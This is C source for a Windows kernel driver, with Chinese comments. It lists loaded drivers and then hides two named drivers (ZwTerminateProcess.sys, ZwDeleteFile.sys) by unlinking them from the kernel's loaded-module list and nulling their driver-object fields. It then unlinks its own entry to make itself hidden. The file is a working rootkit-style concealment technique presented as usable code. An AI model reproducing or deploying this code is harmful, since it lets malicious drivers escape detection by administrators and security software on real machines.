#include <ntifs.h>
#ifndef _NTNoDriverLoad_H
#define _NTNoDriverLoad_H "NTNoDriverLoad"
#endif
extern POBJECT_TYPE* IoDriverObjectType;


/** 结构体 **/
typedef struct _KLDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY64 InLoadOrderLinks;//关键链
	ULONG64 Undefined1;
	ULONG64 Undefined2;
	ULONG64 Undefined3;
	ULONG64 NonPagedDebugInfo;
	ULONG64 DllBase;
	ULONG64 EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG   Flags;
	USHORT  LoadCount;
	USHORT  Undefined5;
	ULONG64 Undefined6;
	ULONG   CheckSum;
	ULONG   padding1;
	ULONG   TimeDateStamp;
	ULONG   padding2;
}KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;//这个成员把系统所有加载（可能是停止没被卸载）已经读取到内存中
	LIST_ENTRY InMemoryOrderLinks;//系统已经启动但没有被初始化，没有调用 DriverEntry 这个历程的时候，通过这个链表进程串接起来
	LIST_ENTRY InInitializationOrderLinks;//已经调用 DriverEntry 这个函数的所有驱动程序
	PVOID DllBase;
	PVOID EntryPoint;//驱动的进入点 DriverEntry
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;//驱动的满路径
	UNICODE_STRING BaseDllName;//不带路径的驱动名字
	ULONG Flags;
	USHORT LoadCount;
	USHORT TlsIndex;
	union SubUnionA
	{
		LIST_ENTRY HashLinks;
		struct SubStructA
		{
			PVOID SectionPointer;
			ULONG CheckSum;
		};
	};
	union SubUnionB
	{
		struct SubStructB
		{
			ULONG TimeDateStamp;
		};
		struct SubStructC
		{
			PVOID LoadedImports;
		};
	};
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;


/** 子函数 **/
/* 是否位于驱动中 */
BOOLEAN isInList(UNICODE_STRING us, UNICODE_STRING arr[], int length, BOOLEAN caseInSensitive)
{
	for (int i = 0; i < length; ++i)
		if (RtlCompareUnicodeString(&us, &(arr[i]), caseInSensitive) == 0)
			return TRUE;
	return FALSE;
}

/* 获取驱动对象 */
NTKERNELAPI NTSTATUS ObReferenceObjectByName(
	__in PUNICODE_STRING ObjectName, 
	__in ULONG Attributes, 
	__in_opt PACCESS_STATE AccessState, //访问权限可以写 0 且写 0 完全访问不受控制 FILE_ALL_ACCESS
	__in_opt ACCESS_MASK DesiredAccess, 
	__in POBJECT_TYPE ObjectType, //对象类型
	__in KPROCESSOR_MODE AccessMode, //内核模式有三种模式 enum 类型
	__inout_opt PVOID ParseContext, 
	__out PVOID* Object//输出对象
);


/** 功能函数 **/
/* 遍历驱动 */
VOID walkDriver(IN PDRIVER_OBJECT pDriverObject)
{
	PLDR_DATA_TABLE_ENTRY p = (PLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
	PLDR_DATA_TABLE_ENTRY first = (PLDR_DATA_TABLE_ENTRY)p->InLoadOrderLinks.Flink;
	PLDR_DATA_TABLE_ENTRY item = (PLDR_DATA_TABLE_ENTRY)first->InLoadOrderLinks.Flink;
	DbgPrint("%s->Current Driver Section = %p, First LDR TABLE = %p", _NTNoDriverLoad_H, p, item);
	while (item != NULL && item != first)
	{
		DbgPrint("%s->%p->%ws", _NTNoDriverLoad_H, item->EntryPoint, item->FullDllName.Buffer);
		item = (PLDR_DATA_TABLE_ENTRY)item->InLoadOrderLinks.Flink;
	}
	return;
}

/* 隐藏驱动 */
int HideDriver(IN PDRIVER_OBJECT pDriverObject, UNICODE_STRING targets[], int length)
{
	int cnt = 0;
	PKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
	PKLDR_DATA_TABLE_ENTRY first = (PKLDR_DATA_TABLE_ENTRY)ldr->InLoadOrderLinks.Flink;//本身的节点
	PKLDR_DATA_TABLE_ENTRY next = (PKLDR_DATA_TABLE_ENTRY)first->InLoadOrderLinks.Flink;//下一个驱动的节点

	while (next != NULL && next != first)//遍历一遍
	{
		DbgPrint("%s->driver name = %wZ\n", _NTNoDriverLoad_H, &next->FullDllName);
		if (next->BaseDllName.Length != 0 && isInList(next->BaseDllName, targets, length, TRUE))//判断是否在数组中
		{
			++cnt;
			PDRIVER_OBJECT Driver = NULL;
			NTSTATUS status = ObReferenceObjectByName(&next->FullDllName, FILE_ALL_ACCESS, 0, 0, *IoDriverObjectType, KernelMode, NULL, &Driver);//通过驱动的到驱动的对象

			if (NT_SUCCESS(status))
			{
				RemoveEntryList((PLIST_ENTRY)(&next->InLoadOrderLinks));
				Driver->DriverInit = NULL;
				Driver->DriverSection = NULL;//从双链表中去除，同时把一些其他的东西也都置 NULL
			}

			break;
		}

		next = (PKLDR_DATA_TABLE_ENTRY)next->InLoadOrderLinks.Flink;//遍历下一个
	}

	return cnt;
}



/** 驱动出入口函数 **/
/* 驱动停止 */
VOID DriverUnload(IN PDRIVER_OBJECT pDriverObject)
{
	UNREFERENCED_PARAMETER(pDriverObject);
	DbgPrint("\n%s->DriverUnload()\n", _NTNoDriverLoad_H);
	DbgPrint("\n%s->Protection Stop! \n", _NTNoDriverLoad_H);
	return;
}

/* 驱动入口 */
NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	DbgPrint("\n%s->DriverEntry()\n", _NTNoDriverLoad_H);
	pDriverObject->DriverUnload = DriverUnload;

	/* 遍历 */
	walkDriver(pDriverObject);

	/* 隐藏 */
	UNICODE_STRING targets[] = { { 0 }, { 0 } };
	RtlInitUnicodeString(&(targets[0]), L"ZwTerminateProcess.sys");
	RtlInitUnicodeString(&(targets[1]), L"ZwDeleteFile.sys");
	HideDriver(pDriverObject, targets, 2);
	
	/* 本驱动隐藏和阻止加载操作 */
	PKLDR_DATA_TABLE_ENTRY list = (PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;//声明必要结构 list 获取自身对象结构
	*((ULONGLONG*)list->InLoadOrderLinks.Blink) = list->InLoadOrderLinks.Flink;//断链操作，上一个对象等于下一个，下一个等于上一个对象，达到把自己隐藏起来的目的
	((LIST_ENTRY64*)list->InLoadOrderLinks.Flink)->Blink = list->InLoadOrderLinks.Blink;
	list->InLoadOrderLinks.Flink = (ULONGLONG)(&list->InLoadOrderLinks);//Flink
	list->InLoadOrderLinks.Blink = (ULONGLONG)(&list->InLoadOrderLinks);//Blink
	DbgPrint("\n%s->Make self hidden successfully! \n", _NTNoDriverLoad_H);

	return STATUS_SUCCESS;
}